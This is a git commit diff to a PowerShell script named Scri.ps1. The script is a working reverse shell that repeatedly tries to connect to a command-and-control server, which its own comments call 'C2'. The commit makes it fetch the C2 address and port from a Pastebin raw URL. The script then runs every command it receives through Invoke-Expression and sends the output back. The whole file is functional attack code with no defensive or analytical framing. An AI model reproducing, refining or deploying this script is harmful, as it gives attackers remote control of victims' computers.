ac22729b527935567668dc6c36a9f62a40683e23
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-14 22:31:41 +0700

    Update Scri.ps1

--- Scri.ps1
+++ Scri.ps1
@@ -1,43 +1,52 @@
+$PastebinRawUrl = 'https://pastebin.com/raw/b9j9rc8N'
+$PastebinContent = Invoke-RestMethod -Uri $PastebinRawUrl
+
+# Split the content into IP address and port
+$IPAddress, $Port = $PastebinContent -split ':'
+
+# Loop until connection is established
 do {
     # Delay before establishing network connection, and between retries
     Start-Sleep -Seconds 1
 
     # Connect to C2
-    try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.2', 13337)
+    try {
+        $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, $Port)
     } catch {}
 } until ($TCPClient.Connected)
 
+# Get network stream and create stream writer
 $NetworkStream = $TCPClient.GetStream()
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
 
 # Writes a string to C2
 function WriteToStream ($String) {
-    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    # Create buffer to be used for the next network stream read. Size is determined by the TCP client receive buffer (65536 by default)
     [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
 
     # Write to C2
-    $StreamWriter.Write($String + 'Meterpreter> ')
+    $StreamWriter.Write($String + 'SHELL> ')
     $StreamWriter.Flush()
 }
 
-# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+# Initial output to C2. The function also creates the initial empty byte array buffer used below.
 WriteToStream ''
 
-# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if the connection is closed.
 while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
     # Encode command, remove last byte/newline
     $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
     
     # Execute command and save output (including errors thrown)
     $Output = try {
-            Invoke-Expression $Command 2>&1 | Out-String
-        } catch {
-            $_ | Out-String
-        }
+        Invoke-Expression $Command 2>&1 | Out-String
+    } catch {
+        $_ | Out-String
+    }
 
     # Write output to C2
     WriteToStream ($Output)
 }
-# Closes the StreamWriter and the underlying TCPClient
+
+# Close the StreamWriter and the underlying TCPClient
 $StreamWriter.Close()
